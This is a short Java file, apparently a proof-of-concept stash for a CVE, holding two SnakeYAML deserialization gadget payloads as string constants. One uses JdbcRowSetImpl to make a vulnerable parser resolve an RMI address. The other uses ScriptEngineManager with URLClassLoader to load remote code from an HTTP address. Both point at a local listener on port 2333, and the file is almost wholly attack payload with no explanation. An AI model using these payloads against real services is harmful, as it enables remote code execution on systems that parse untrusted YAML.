package CVE;

public class gadget {
    public static void main(String[] args) {
        String poc = "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'rmi://127.0.0.1:2333/exp', autoCommit: true}";
        String poc1 = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:2333/\"]]]]";

    }
}
